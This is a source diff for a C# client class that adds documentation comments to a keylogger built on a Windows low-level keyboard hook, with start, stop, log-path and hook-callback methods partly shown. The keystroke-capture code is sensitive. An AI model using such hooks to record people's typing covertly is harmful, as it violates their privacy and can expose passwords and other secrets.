@@ -15,11 +15,15 @@ namespace TrackzamClient
             _proc = HookCallback;
         }
 
+
         public string Path
         {
             get => _logDir;
         }
-
+        /// <summary>
+        ///  starts the keylogger
+        /// </summary>
+        /// <param name="path"> directory to save the log file </param>
         public void Start(string path)
         {
             SetPath(path);
@@ -28,6 +32,9 @@ namespace TrackzamClient
             // start the hook
             _hookID = SetHook(_proc);
         }
+        /// <summary>
+        /// Stops the keylogger
+        /// </summary>
         public void Stop()
         {
             // stop the keyboard hook
@@ -36,7 +43,11 @@ namespace TrackzamClient
             _writer.Close();
         }
 
-        // returns true if the path is set successfully without errors
+        /// <summary>
+        /// Sets the directory to save the log file 
+        /// </summary>
+        /// <param name="path"> the directory </param>
+        /// <returns>  true if the path is set successfully without errors </returns>
         public bool SetPath(string path)
         {
             if (Directory.Exists(path))
@@ -64,9 +75,11 @@ namespace TrackzamClient
 
         }
 
-        // for clients read-only
-
-
+        /// <summary>
+        /// sets a keyboard to record the keyboard events
+        /// </summary>
+        /// <param name="proc"> the win api process </param>
+        /// <returns> pointer to the initiallized hook </returns>
         private IntPtr SetHook(LowLevelKeyboardProc proc)
         {
             using (Process curProcess = Process.GetCurrentProcess())
@@ -80,6 +93,14 @@ namespace TrackzamClient
         private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
 
         private delegate IntPtr LowLevelMouseProc(int ncode, IntPtr wParam, IntPtr lParam);
+
+        /// <summary>
+        /// 
+        /// </summary>
+        /// <param name="nCode"> </param>
+        /// <param name="wParam"></param>
+        /// <param name="lParam"></param>
+        /// <returns></returns>
         private IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
         {
             if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
